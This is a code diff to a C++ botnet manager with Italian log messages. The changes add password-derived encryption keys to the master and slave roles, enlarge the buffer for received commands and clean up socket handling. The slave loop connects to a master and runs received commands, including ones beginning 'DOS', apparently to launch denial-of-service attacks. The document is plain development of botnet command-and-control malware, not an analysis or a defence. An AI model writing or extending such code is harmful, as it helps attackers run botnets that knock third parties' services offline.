@@ -3,7 +3,11 @@
 
 BotnetManager::BotnetManager() : master_socket(-1), master_port(DEFAULT_BOTNET_PORT) {}
 
-void BotnetManager::startMaster(int port) {
+void BotnetManager::startMaster(int port, const std::string &password) {
+    if (!password.empty()) {
+        crypto.deriveKey(password);
+    }
+    
     master_port = port;
     g_is_master = true;
     
@@ -58,7 +62,11 @@ void BotnetManager::masterListener() {
     }
 }
 
-void BotnetManager::startSlave(const std::string &ip, int port) {
+void BotnetManager::startSlave(const std::string &ip, int port, const std::string &password) {
+    if (!password.empty()) {
+        crypto.deriveKey(password);
+    }
+    
     master_ip = ip;
     master_port = port;
     g_is_slave = true;
@@ -77,13 +85,13 @@ void BotnetManager::slaveConnector() {
         if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
             Utils::logSuccess("Connesso al MASTER " + master_ip + ":" + std::to_string(master_port));
             
-            char buffer[1024];
+            char buffer[4096];
             while (g_running && g_is_slave) {
                 int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
                 if (bytes > 0) {
                     buffer[bytes] = '\0';
                     std::string cmd(buffer);
-                    Utils::logWarning("Comando ricevuto dal master: " + cmd);
+                    Utils::logWarning("Comando ricevuto: " + cmd);
                     
                     if (cmd.find("DOS") == 0) {
                         auto parts = Utils::split(cmd, ' ');
@@ -99,7 +107,7 @@ void BotnetManager::slaveConnector() {
                 }
             }
         } else {
-            Utils::logError("Connessione al master fallita, retry in 5s...");
+            Utils::logError("Connessione fallita, retry in 5s...");
             sleep(5);
         }
         close(sock);
@@ -126,7 +134,7 @@ void BotnetManager::stop() {
     g_is_slave = false;
     if (listener_thread.joinable()) listener_thread.join();
     if (slave_thread.joinable()) slave_thread.join();
-    close(master_socket);
+    if (master_socket >= 0) close(master_socket);
 }
 
 bool BotnetManager::isMaster() const { 
